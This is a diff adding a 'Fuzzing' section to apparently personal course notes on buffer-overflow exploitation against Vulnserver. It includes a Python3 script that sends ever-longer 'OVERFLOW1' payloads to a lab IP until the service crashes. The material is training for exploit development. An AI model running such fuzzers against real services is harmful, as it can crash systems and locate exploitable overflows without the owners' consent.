@@ -62,4 +62,38 @@ $_string_variable("0");
 
 ## Fuzzing
 
-* continues from here...
+* it's like spiking but now that we now which command is vulnerable we're going to attack that specific command
+* if you crashed it attach Vulnserver back and restart the service (little play button)
+
+### fuzzing.py
+
+* ⚠️ This script is a bit different from what was shown during the course, but it's more up to date and is for Python3
+
+```
+#!/usr/bin/env python3
+
+import socket, time, sys
+
+ip = "10.10.239.130"
+
+port = 1337
+timeout = 5
+prefix = "OVERFLOW1 "
+
+string = prefix + "A" * 100
+
+while True:
+  try:
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+      s.settimeout(timeout)
+      s.connect((ip, port))
+      s.recv(1024)
+      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
+      s.send(bytes(string, "latin-1"))
+      s.recv(1024)
+  except:
+    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
+    sys.exit(0)
+  string += 100 * "A"
+  time.sleep(1)
+```
